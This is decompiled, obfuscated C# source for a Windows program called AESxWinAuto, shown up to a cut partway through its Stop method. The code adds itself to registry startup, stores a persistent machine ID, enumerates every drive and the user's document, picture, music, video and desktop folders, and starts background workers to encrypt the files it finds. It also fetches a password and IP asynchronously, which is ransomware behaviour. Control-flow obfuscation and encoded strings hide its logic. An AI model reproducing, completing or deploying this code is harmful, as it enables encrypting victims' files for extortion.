using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using A6yJVNZuoAn9NC1LAS;
using AESxWin.Helpers;
using Microsoft.Win32;
using WKtExBGrT2f6h026To;

namespace AESxWin;

public class AESxWinAuto : Form
{
	public static string[] image_ext;

	public static string[] video_ext;

	public static string[] audio_ext;

	public static string[] document_ext;

	public static string[] compressed_ext;

	public static string[] code_ext;

	public List<string> StartPaths;

	private BackgroundWorker bwEncryptor;

	private BackgroundWorker bwPathFinder;

	private Queue<string> PathsQueue;

	private bool FinishedPathFinder;

	private long EncryptionCount;

	private long TotalFindPaths;

	private bool requestSent;

	private bool _isAutostart;

	private string _currentPassword;

	private string _currentIP;

	private bool _isStarted;

	private IContainer components;

	private Button btnStartAutoEncrypt;

	private CheckBox chckIsStartup;

	private Timer timer1;

	private Timer timer2;

	private Button button1;

	private Button button3;

	private Timer timer3;

	private ComboBox comboBox2;

	private WebBrowser webBrowser1;

	private Timer timer4;

	private CheckBox checkBox1;

	private Button button8;

	private ComboBox comboBox3;

	private Button button9;

	private Button button10;

	private Button button11;

	private Button button12;

	private ComboBox comboBox1;

	public static string LogPath
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public static string ErrorLogPath
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public List<string> IgnoredPaths
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public string[] SearchExtensions
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public bool IsStartup
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(S7EI44sMaZQ92MiG6X.pA2PN5iOW(196), writable: true);
			return registryKey.GetValue(Assembly.GetExecutingAssembly().GetName().Name) != null;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			Reg.RegisterInStartup(value, Application.get_ExecutablePath());
		}
	}

	public bool IsAutostart
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _isAutostart;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			_isAutostart = value;
		}
	}

	public string CurrentPassword
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _currentPassword;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			_currentPassword = value;
		}
	}

	public string CurrentIP
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _currentIP;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			_currentIP = value;
		}
	}

	public Guid ComputerId
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005, IL_0037
			//IL_0006: Incompatible stack heights: 0 vs 1
			int num = 4;
			bool flag = default(bool);
			Guid result2 = default(Guid);
			string text = default(string);
			Guid result = default(Guid);
			while (true)
			{
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					case 3:
					case 5:
						if (flag)
						{
							num = 8;
							break;
						}
						result2 = Guid.NewGuid();
						num = 9;
						break;
					case 8:
						Guid.TryParse(text, out result2);
						goto case 0;
					default:
						num = 0;
						if (true)
						{
							break;
						}
						goto case 0;
					case 0:
					case 6:
						result = result2;
						num2 = 10;
						continue;
					case 4:
						result2 = default(Guid);
						num2 = 7;
						continue;
					case 7:
						text = Reg.Read(S7EI44sMaZQ92MiG6X.pA2PN5iOW(200));
						_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
						num2 = (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092() ? 1 : 5);
						continue;
					case 9:
						Reg.Write(S7EI44sMaZQ92MiG6X.pA2PN5iOW(200), result2);
						num2 = 6;
						continue;
					case 1:
					case 2:
						flag = text != null;
						goto case 3;
					case 10:
						return result;
					}
					break;
				}
			}
		}
	}

	public bool IsStarted
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _isStarted;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005, IL_0020
			//IL_0006: Incompatible stack heights: 0 vs 1
			int num = 6;
			bool isStarted = default(bool);
			while (true)
			{
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					case 2:
						if (isStarted)
						{
							goto default;
						}
						((Control)btnStartAutoEncrypt).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(208));
						num2 = 7;
						continue;
					default:
						_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							num = 0;
							break;
						}
						num = 5;
						if (1 == 0)
						{
							return;
						}
						break;
					case 6:
						_isStarted = value;
						num = 1;
						if (0 == 0)
						{
							break;
						}
						goto case 1;
					case 1:
						isStarted = _isStarted;
						num2 = 2;
						continue;
					case 4:
						return;
					case 5:
						return;
					case 0:
					case 3:
						((Control)btnStartAutoEncrypt).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(204));
						return;
					case 7:
						return;
					}
					break;
				}
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public AESxWinAuto()
	{
		//Discarded unreachable code: IL_0005, IL_0247
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 10;
		bool flag = default(bool);
		DateTime now = default(DateTime);
		string text = default(string);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 1:
						break;
					case 29:
						IsStartup = true;
						num3 = 32;
						continue;
					case 12:
						flag = !Directory.Exists(LogPath);
						num2 = 19;
						goto end_IL_0254;
					case 27:
						now = DateTime.Now;
						num2 = 28;
						if (0 == 0)
						{
							goto end_IL_0254;
						}
						goto case 32;
					case 32:
						chckIsStartup.set_Checked(IsStartup);
						num3 = 31;
						continue;
					case 10:
						goto IL_0092;
					case 7:
						goto IL_00ab;
					case 25:
						goto IL_00bc;
					case 8:
						Directory.CreateDirectory(LogPath);
						num = 27;
						goto end_IL_0250;
					case 23:
						PathsQueue = new Queue<string>();
						num3 = 24;
						continue;
					case 3:
						Log.WriteLog(LogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(228));
						num3 = 29;
						continue;
					case 30:
						InitIgnoredPaths();
						num2 = 20;
						goto end_IL_0254;
					case 15:
						_isStarted = false;
						goto case 13;
					case 20:
						goto IL_014c;
					case 6:
						_currentPassword = string.Empty;
						num3 = 33;
						continue;
					case 14:
						LogPath = Path.Combine(LogPath, text + S7EI44sMaZQ92MiG6X.pA2PN5iOW(220));
						num2 = 5;
						goto end_IL_0254;
					case 33:
						_currentIP = string.Empty;
						num3 = 15;
						continue;
					case 19:
						if (flag)
						{
							num = 8;
							goto end_IL_0250;
						}
						goto case 27;
					case 0:
						TotalFindPaths = 0L;
						num = 1;
						goto end_IL_0250;
					case 16:
						bwPathFinder = null;
						num3 = 23;
						continue;
					case 4:
						EncryptionCount = 0L;
						num2 = 0;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto end_IL_0254;
						}
						goto case 15;
					case 2:
						GetPassword();
						num2 = 34;
						if (true)
						{
							goto end_IL_0254;
						}
						goto case 18;
					case 18:
						GetIP();
						num3 = 2;
						continue;
					case 17:
						LogPath = S7EI44sMaZQ92MiG6X.pA2PN5iOW(212);
						goto case 12;
					default:
						num2 = 12;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0254;
						}
						goto case 29;
					case 13:
					case 21:
						components = null;
						num2 = 26;
						if (0 == 0)
						{
							goto end_IL_0254;
						}
						goto case 28;
					case 28:
						text = now.ToString(S7EI44sMaZQ92MiG6X.pA2PN5iOW(216));
						num2 = 14;
						if (true)
						{
							goto end_IL_0254;
						}
						goto case 31;
					case 31:
						InitSearchExtensions();
						num3 = 30;
						continue;
					case 5:
						ErrorLogPath = Path.Combine(LogPath, text + S7EI44sMaZQ92MiG6X.pA2PN5iOW(224));
						num = 3;
						goto end_IL_0250;
					case 11:
						InitializeComponent();
						num2 = 17;
						goto end_IL_0254;
					case 24:
						FinishedPathFinder = false;
						num = 4;
						goto end_IL_0250;
					case 26:
						((Form)this)._002Ector();
						num = 11;
						goto end_IL_0250;
					case 9:
					case 22:
						_isAutostart = true;
						num2 = 6;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0254;
						}
						goto case 8;
					case 34:
						return;
					}
					requestSent = false;
					_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 22;
						goto end_IL_0250;
					}
					num2 = 21;
					if (0 == 0)
					{
						break;
					}
					goto IL_014c;
					IL_00bc:
					StartPaths = new List<string>();
					num = 7;
					goto end_IL_0250;
					IL_00ab:
					bwEncryptor = null;
					num = 16;
					goto end_IL_0250;
					IL_0092:
					if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(44))
					{
						num = 25;
						goto end_IL_0250;
					}
					return;
					IL_014c:
					InitStartPaths();
					num2 = 18;
					break;
					continue;
					end_IL_0254:
					break;
				}
				continue;
				end_IL_0250:
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitSearchExtensions()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		SearchExtensions = image_ext;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitIgnoredPaths()
	{
		//Discarded unreachable code: IL_0005, IL_0049
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_00df: Incompatible stack heights: 0 vs 1
		int num = 2;
		while (true)
		{
			int num3;
			int num2;
			switch (num)
			{
			case 4:
				IgnoredPaths.Add(Path.GetDirectoryName(Application.get_ExecutablePath()));
				num = 7;
				break;
			case 3:
			case 6:
				IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
				goto case 1;
			default:
				num = 1;
				break;
			case 1:
				IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
				goto case 0;
			case 2:
				IgnoredPaths = new List<string>();
				num3 = 4;
				goto IL_004e;
			case 7:
				IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num = 0;
					break;
				}
				num2 = 6;
				if (0 == 0)
				{
					goto IL_0052;
				}
				goto case 0;
			case 0:
			case 5:
				IgnoredPaths.Add(S7EI44sMaZQ92MiG6X.pA2PN5iOW(232));
				num3 = 8;
				goto IL_004e;
			case 8:
				return;
				IL_0052:
				num = num2;
				break;
				IL_004e:
				num2 = num3;
				goto IL_0052;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitStartPaths()
	{
		//Discarded unreachable code: IL_0005, IL_01d4
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0250: Incompatible stack heights: 0 vs 1
		int num = 8;
		int num4 = default(int);
		DriveInfo driveInfo = default(DriveInfo);
		DriveInfo[] array = default(DriveInfo[]);
		DriveInfo[] drives = default(DriveInfo[]);
		while (true)
		{
			int num3;
			int num2;
			switch (num)
			{
			case 12:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
				num3 = 3;
				goto IL_01d9;
			case 9:
				num4++;
				goto case 6;
			case 4:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
				num3 = 15;
				goto IL_01d9;
			case 13:
			{
				Guid computerId = ComputerId;
				num3 = 0;
				goto IL_01d9;
			}
			case 11:
			case 22:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
				num3 = 12;
				goto IL_01d9;
			case 3:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
				num = 5;
				break;
			case 17:
				StartPaths.Add(driveInfo.RootDirectory.Name);
				num2 = 9;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 0;
				}
				goto IL_01dd;
			case 0:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
				num3 = 4;
				goto IL_01d9;
			case 5:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
				num2 = 16;
				if (1 == 0)
				{
					goto case 8;
				}
				goto IL_01dd;
			case 8:
				if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(48))
				{
					num = 7;
					break;
				}
				return;
			case 21:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
				num2 = 18;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 14;
				}
				goto IL_01dd;
			case 14:
				num4 = 0;
				num2 = 6;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 6;
				}
				goto IL_01dd;
			case 6:
			case 19:
			case 20:
				if (num4 >= array.Length)
				{
					num2 = 23;
				}
				else
				{
					driveInfo = array[num4];
					num2 = 17;
					if (false)
					{
						return;
					}
				}
				goto IL_01dd;
			case 7:
				do
				{
					drives = FilesHelper.GetDrives();
					num2 = 13;
				}
				while (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092());
				goto IL_01dd;
			case 2:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
				num3 = 1;
				goto IL_01d9;
			case 10:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
				goto default;
			default:
				_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
				num3 = ((!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()) ? 22 : 19);
				goto IL_01d9;
			case 1:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
				num3 = 10;
				goto IL_01d9;
			case 15:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
				num2 = 21;
				if (true)
				{
					goto IL_01dd;
				}
				goto case 18;
			case 18:
				StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
				num2 = 2;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_01dd;
				}
				goto case 16;
			case 16:
				array = drives;
				num3 = 14;
				goto IL_01d9;
			case 23:
				return;
				IL_01d9:
				num2 = num3;
				goto IL_01dd;
				IL_01dd:
				num = num2;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CGetPassword_003Ed__55))]
	private void GetPassword()
	{
		//Discarded unreachable code: IL_0005, IL_006b
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		_003CGetPassword_003Ed__55 stateMachine = default(_003CGetPassword_003Ed__55);
		AsyncVoidMethodBuilder _003C_003Et__builder = default(AsyncVoidMethodBuilder);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 0:
					stateMachine = new _003CGetPassword_003Ed__55();
					_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
					num = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 5 : 7);
					break;
				case 3:
					_003C_003Et__builder.Start(ref stateMachine);
					num2 = 8;
					if (0 == 0)
					{
						continue;
					}
					goto case 1;
				case 1:
				case 7:
					stateMachine._003C_003E4__this = this;
					num2 = 2;
					if (0 == 0)
					{
						continue;
					}
					goto case 6;
				case 6:
					stateMachine._003C_003E1__state = -1;
					goto default;
				default:
					_003C_003Et__builder = stateMachine._003C_003Et__builder;
					num = 3;
					break;
				case 2:
					stateMachine._003C_003Et__builder = AsyncVoidMethodBuilder.Create();
					num = 6;
					break;
				case 8:
					return;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CGetIP_003Ed__56))]
	private void GetIP()
	{
		//Discarded unreachable code: IL_0005, IL_003e
		//IL_0006: Incompatible stack heights: 0 vs 1
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num = (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091() ? 7 : 6);
		_003CGetIP_003Ed__56 stateMachine = default(_003CGetIP_003Ed__56);
		AsyncVoidMethodBuilder _003C_003Et__builder = default(AsyncVoidMethodBuilder);
		while (true)
		{
			int num2;
			switch (num)
			{
			case 1:
			case 7:
				stateMachine._003C_003E4__this = this;
				num = 5;
				break;
			case 2:
				stateMachine._003C_003E1__state = -1;
				goto case 4;
			default:
				num2 = 4;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_0047;
				}
				goto case 5;
			case 5:
				stateMachine._003C_003Et__builder = AsyncVoidMethodBuilder.Create();
				num2 = 2;
				goto IL_0047;
			case 4:
				_003C_003Et__builder = stateMachine._003C_003Et__builder;
				num2 = 3;
				goto IL_0047;
			case 3:
				_003C_003Et__builder.Start(ref stateMachine);
				num = 8;
				break;
			case 0:
			case 6:
				stateMachine = new _003CGetIP_003Ed__56();
				goto case 1;
			case 8:
				return;
				IL_0047:
				num = num2;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void chckIsStartup_Click(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		IsStartup = chckIsStartup.get_Checked();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void btnStartAutoEncrypt_Click(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_0089
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 4;
			goto IL_008e;
		}
		int num2 = 2;
		if (false)
		{
			goto IL_0050;
		}
		goto IL_0092;
		IL_008e:
		num2 = num;
		goto IL_0092;
		IL_006a:
		bool enabled = default(bool);
		if (enabled)
		{
			num2 = 8;
			goto IL_0092;
		}
		return;
		IL_0092:
		bool flag = default(bool);
		while (true)
		{
			switch (num2)
			{
			case 5:
				break;
			case 0:
			case 4:
				enabled = ((Control)btnStartAutoEncrypt).get_Enabled();
				goto IL_006a;
			case 8:
				goto IL_0050;
			case 1:
			case 2:
				goto IL_006a;
			case 3:
				if (flag)
				{
					goto case 6;
				}
				goto IL_00f7;
			default:
				num2 = 6;
				continue;
			case 6:
				IsStarted = !IsStarted;
				num2 = 5;
				if (0 == 0)
				{
					continue;
				}
				return;
			case 7:
				return;
			case 9:
				return;
			}
			break;
		}
		Start();
		num = 7;
		goto IL_008e;
		IL_00f7:
		Stop();
		num = 9;
		goto IL_008e;
		IL_0050:
		flag = !IsStarted;
		num2 = 3;
		if (false)
		{
			goto IL_006a;
		}
		goto IL_0092;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Start()
	{
		//Discarded unreachable code: IL_0005, IL_010d, IL_01f3, IL_0297
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 6;
			if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				goto IL_01fc;
			}
			goto IL_0257;
		}
		int num2 = 13;
		goto IL_01f8;
		IL_0257:
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string text = default(string);
		try
		{
			while (enumerator.MoveNext())
			{
				string current = enumerator.Current;
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				switch ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 3 : 2)
				{
				case 0:
				case 2:
					text = text + current + S7EI44sMaZQ92MiG6X.pA2PN5iOW(236);
					break;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator).Dispose();
		}
		Log.WriteLog(LogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(240) + text);
		num = 17;
		if (true)
		{
			goto IL_01fc;
		}
		goto IL_0312;
		IL_0312:
		enumerator = StartPaths.GetEnumerator();
		num2 = 9;
		goto IL_01f8;
		IL_01f8:
		num = num2;
		goto IL_01fc;
		IL_01fc:
		bool lockTaken = default(bool);
		Queue<string> pathsQueue = default(Queue<string>);
		while (true)
		{
			IL_01fc_2:
			int num3 = num;
			while (true)
			{
				switch (num3)
				{
				case 0:
				case 6:
					if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(52))
					{
						num3 = 15;
						continue;
					}
					return;
				case 8:
					bwEncryptor = new BackgroundWorker();
					num3 = 4;
					continue;
				case 11:
					bwEncryptor.RunWorkerCompleted += BwEncryptor_RunWorkerCompleted;
					num = 1;
					if (true)
					{
						goto IL_01fc_2;
					}
					goto case 10;
				case 10:
					bwPathFinder.DoWork += BwPathFinder_DoWork;
					num3 = 16;
					continue;
				case 5:
					lockTaken = false;
					num = 2;
					if (0 == 0)
					{
						goto IL_01fc_2;
					}
					goto case 3;
				case 3:
					pathsQueue = PathsQueue;
					num2 = 5;
					goto IL_01f8;
				case 12:
				case 13:
					text = string.Empty;
					num = 7;
					goto IL_01fc_2;
				case 2:
					try
					{
						Monitor.Enter(pathsQueue, ref lockTaken);
						_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
						int num4;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							num4 = 2;
							goto IL_011a;
						}
						int num5 = 3;
						if (true)
						{
							num4 = num5;
							goto IL_011a;
						}
						goto end_IL_00da;
						IL_011a:
						switch (num4)
						{
						case 0:
						case 2:
							PathsQueue.Clear();
							break;
						case 3:
							break;
						}
						end_IL_00da:;
					}
					finally
					{
						if (lockTaken)
						{
							Monitor.Exit(pathsQueue);
						}
					}
					bwPathFinder = new BackgroundWorker();
					num3 = 14;
					continue;
				case 4:
					bwEncryptor.DoWork += BwEncryptor_DoWork;
					num = 11;
					goto IL_01fc_2;
				case 1:
					bwEncryptor.RunWorkerAsync();
					goto case 12;
				case 15:
					EncryptionCount = 0L;
					num2 = 3;
					goto IL_01f8;
				case 14:
					bwPathFinder.RunWorkerCompleted += BwPathFinder_RunWorkerCompleted;
					num3 = 10;
					continue;
				case 16:
					bwPathFinder.RunWorkerAsync();
					goto case 8;
				default:
					num2 = 8;
					goto IL_01f8;
				case 9:
					break;
				case 7:
					goto IL_0312;
				case 17:
					return;
				}
				break;
			}
			break;
		}
		goto IL_0257;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Stop()
	{
		//Discarded unreachable code: IL_0005, IL_0056, IL_00d4
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		Queue<string> pathsQueue = default(Queue<string>);
		bool lockTaken = default(bool);
		while (true)
		{
			int num2;
			switch (num)
			{
			case 1:
			case 4:
				Thread.Sleep(50);
				num = 2;
				continue;
			case 0:
				IsStarted = false;
				_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					num2 = 4;
					goto IL_005f;
				}
				num = 5;
				continue;
			case 2:
				pathsQueue = PathsQueue;
				goto default;
			default:
				lockTaken = false;
				num2 = 6;
				if (1 == 0)
				{
					break;
				}
				goto IL_005f;
			case 6:
				break;
				IL_005f:
				num = num2;
				continue;
			}
			break;
		}
		try
		{
			Monitor.Enter(pathsQueue, ref lockTaken);
			_ = 0;
